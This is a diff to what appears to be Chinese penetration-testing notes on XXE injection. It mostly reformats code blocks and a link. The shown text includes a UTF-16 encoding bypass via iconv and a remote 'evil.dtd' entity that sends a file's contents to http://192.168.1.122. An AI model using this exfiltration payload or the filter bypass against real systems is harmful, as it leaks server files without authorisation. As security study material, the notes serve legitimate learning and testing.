@@ -2,9 +2,11 @@
 # XXE/XML实体注入
 
 绕过 -- XXE编码转换成utf-16编码绕过
-    `iconv -f utf8 -t utf-16 2.xml>1.xml`
-了解 https://blog.csdn.net/weixin_39997829/article/details/79654861
-    抓包看是否解析了xml内容, 如果可控。可能存在xxe
+```
+iconv -f utf8 -t utf-16 2.xml>1.xml
+```
+
+[初识XXE漏洞](https://blog.csdn.net/weixin_39997829/article/details/79654861) 抓包看是否解析了xml内容, 如果可控。可能存在xxe
 
 ## 格式
 ```xml
@@ -80,7 +82,7 @@ $data = simplexml_load_string($xml);
 #print_r($data);
 ```
 远程 evil.dtd
-```text
+```xml
 <!ENTITY % all
 "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.122/?%file;'>"
 >
